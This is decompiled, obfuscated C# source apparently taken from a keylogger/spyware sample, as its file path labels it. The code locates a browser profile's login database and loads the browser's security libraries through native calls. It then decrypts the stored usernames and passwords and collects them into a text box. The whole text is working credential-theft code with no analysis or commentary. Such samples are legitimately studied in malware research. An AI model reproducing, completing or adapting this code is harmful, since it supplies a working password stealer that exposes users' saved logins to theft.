// Decompiled with JetBrains decompiler
// Type: .
// Assembly: d1a3l0s, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 50A68CBD-55EA-4E40-8DCB-F2A44DFB42DE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.aml-44c1ddfbe16f7426b43f0f84e1cff26f11ab5843bd621cd6766374fa6511763b.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace \u0003
{
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    private static IntPtr \u0001;
    public static string \u0001;

    public static void \u0002()
    {
      Path.GetTempPath();
      try
      {
        bool flag = false;
        string str1 = Environment.GetEnvironmentVariable(\u0003.\u0002.\u0001(387)) + \u0003.\u0002.\u0001(404);
        string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable(\u0003.\u0002.\u0001(429)) + \u0003.\u0002.\u0001(442));
        int index1 = 0;
        while (index1 < directories.Length)
        {
          string path = directories[index1];
          if (!flag)
          {
            string[] files = Directory.GetFiles(path);
            int index2 = 0;
            while (index2 < files.Length)
            {
              string input = files[index2];
              if (!flag)
              {
                if (Regex.IsMatch(input, \u0003.\u0002.\u0001(479)))
                {
                  \u0003.\u0002.\u0002(path);
                  \u0003.\u0002.\u0001 = input;
                }
                checked { ++index2; }
              }
              else
                break;
            }
            checked { ++index1; }
          }
          else
            break;
        }
        string str2 = \u0003.\u0002.\u0001;
        \u0003.\u0002.\u0001 obj1 = new \u0003.\u0002.\u0001();
        \u0003.\u0002.\u0001 obj2 = new \u0003.\u0002.\u0001();
        \u0003.\u0002.\u0001 obj3 = new \u0003.\u0002.\u0001();
        \u0003.\u0001 obj4 = new \u0003.\u0001(str2);
        DataTable dataTable1 = obj4.\u0002(\u0003.\u0002.\u0001(500));
        DataTable dataTable2 = obj4.\u0002(\u0003.\u0002.\u0001(537));
        Console.WriteLine(\u0003.\u0002.\u0001(327));
        try
        {
          foreach (DataRow row in dataTable2.Rows)
            Console.WriteLine(row[\u0003.\u0002.\u0001(582)].ToString());
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        Console.WriteLine();
        Console.WriteLine();
        \u0003.\u0002.\u0002(\u0003.\u0002.\u0002(), true, 0L);
        \u0002.\u0003.\u0002().\u0002().\u0004().Text += \u0003.\u0002.\u0001(595);
        Console.WriteLine();
        try
        {
          foreach (DataRow row in dataTable1.Rows)
          {
            string str3 = Convert.ToString(row[\u0003.\u0002.\u0001(652)].ToString());
            TextBox textBox1 = \u0002.\u0003.\u0002().\u0002().\u0004();
            textBox1.Text = textBox1.Text + \u0003.\u0002.\u0001(673) + str3 + \u0003.\u0002.\u0001(686);
            StringBuilder stringBuilder1 = new StringBuilder(row[\u0003.\u0002.\u0001(695)].ToString());
            IntPtr num = new IntPtr(\u0003.\u0002.\u0002(IntPtr.Zero, IntPtr.Zero, stringBuilder1, stringBuilder1.Length));
            \u0003.\u0002.\u0001 structure1 = (\u0003.\u0002.\u0001) Marshal.PtrToStructure(num, typeof (\u0003.\u0002.\u0001));
            if (\u0003.\u0002.\u0002(ref structure1, ref obj2, 0) == 0 && obj2.\u0003 != 0)
            {
              byte[] numArray = new byte[checked (obj2.\u0003 - 1 + 1)];
              num = new IntPtr(obj2.\u0002);
              Marshal.Copy(num, numArray, 0, obj2.\u0003);
              TextBox textBox2 = \u0002.\u0003.\u0002().\u0002().\u0004();
              textBox2.Text = textBox2.Text + \u0003.\u0002.\u0001(720) + Encoding.ASCII.GetString(numArray) + \u0003.\u0002.\u0001(686);
            }
            StringBuilder stringBuilder2 = new StringBuilder(row[\u0003.\u0002.\u0001(729)].ToString());
            num = new IntPtr(\u0003.\u0002.\u0002(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length));
            \u0003.\u0002.\u0001 structure2 = (\u0003.\u0002.\u0001) Marshal.PtrToStructure(num, typeof (\u0003.\u0002.\u0001));
            if (\u0003.\u0002.\u0002(ref structure2, ref obj3, 0) == 0 && obj3.\u0003 != 0)
            {
              byte[] numArray = new byte[checked (obj3.\u0003 - 1 + 1)];
              num = new IntPtr(obj3.\u0002);
              Marshal.Copy(num, numArray, 0, obj3.\u0003);
              TextBox textBox3 = \u0002.\u0003.\u0002().\u0002().\u0004();
              textBox3.Text = textBox3.Text + \u0003.\u0002.\u0001(754) + Encoding.ASCII.GetString(numArray) + \u0003.\u0002.\u0001(763);
            }
            \u0002.\u0003.\u0002().\u0002().\u0004().Text += \u0003.\u0002.\u0001(776);
            Console.WriteLine();
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("kernel32", EntryPoint = "LoadLibraryExA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u0002([MarshalAs(UnmanagedType.VBByRefStr)] ref string dllFilePath);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr \u0002([In] IntPtr obj0, [In] string obj1);

    public static long \u0002([In] string obj0)
    {
      string str = Environment.GetEnvironmentVariable(\u0003.\u0002.\u0001(387)) + \u0003.\u0002.\u0001(404);
      string dllFilePath1 = str + \u0003.\u0002.\u0001(821);
      \u0003.\u0002.\u0002(ref dllFilePath1);
      string dllFilePath2 = str + \u0003.\u0002.\u0001(838);
      \u0003.\u0002.\u0002(ref dllFilePath2);
      string dllFilePath3 = str + \u0003.\u0002.\u0001(851);
      \u0003.\u0002.\u0002(ref dllFilePath3);
      string dllFilePath4 = str + \u0003.\u0002.\u0001(864);
      \u0003.\u0002.\u0002(ref dllFilePath4);
      string dllFilePath5 = str + \u0003.\u0002.\u0001(877);
      \u0003.\u0002.\u0002(ref dllFilePath5);
      string dllFilePath6 = str + \u0003.\u0002.\u0001(894);
      \u0003.\u0002.\u0002(ref dllFilePath6);
      string dllFilePath7 = str + \u0003.\u0002.\u0001(911);
      \u0003.\u0002.\u0002(ref dllFilePath7);
      string dllFilePath8 = str + \u0003.\u0002.\u0001(928);
      \u0003.\u0002.\u0002(ref dllFilePath8);
      string dllFilePath9 = str + \u0003.\u0002.\u0001(945);
      \u0003.\u0002.\u0001 = \u0003.\u0002.\u0002(ref dllFilePath9);
      return ((\u0003.\u0002.\u0002) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002.\u0002(\u0003.\u0002.\u0001, \u0003.\u0002.\u0001(958)), typeof (\u0003.\u0002.\u0002)))(obj0);
    }

    public static long \u0002() => ((\u0003.\u0002.\u0003) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002.\u0002(\u0003.\u0002.\u0001, \u0003.\u0002.\u0001(971)), typeof (\u0003.\u0002.\u0003)))();

    public static long \u0002([In] long obj0, [In] bool obj1, [In] long obj2) => ((\u0003.\u0002.\u0004) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002.\u0002(\u0003.\u0002.\u0001, \u0003.\u0002.\u0001(1004)), typeof (\u0003.\u0002.\u0004)))(obj0, obj1, obj2);

    public static int \u0002([In] IntPtr obj0, [In] IntPtr obj1, [In] StringBuilder obj2, [In] int obj3) => ((\u0003.\u0002.\u0005) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002.\u0002(\u0003.\u0002.\u0001, \u0003.\u0002.\u0001(1029)), typeof (\u0003.\u0002.\u0005)))(obj0, obj1, obj2, obj3);

    public static int \u0002([In] ref \u0003.\u0002.\u0001 obj0, [In] ref \u0003.\u0002.\u0001 obj1, [In] int obj2) => ((\u0003.\u0002.\u0006) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002.\u0002(\u0003.\u0002.\u0001, \u0003.\u0002.\u0001(1062)), typeof (\u0003.\u0002.\u0006)))(ref obj0, ref obj1, obj2);

    static \u0002() => \u0001.\u0002.\u0002();

    public struct \u0001
    {
      public int \u0001;
      public int \u0002;
      public int \u0003;
    }

    public delegate long \u0002(string configdir);

    public delegate long \u0003();

    public delegate long \u0004(long slot, bool loadCerts, long wincx);

    public delegate int \u0005(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

    public delegate int \u0006(ref \u0003.\u0002.\u0001 data, ref \u0003.\u0002.\u0001 result, int cx);
  }
}
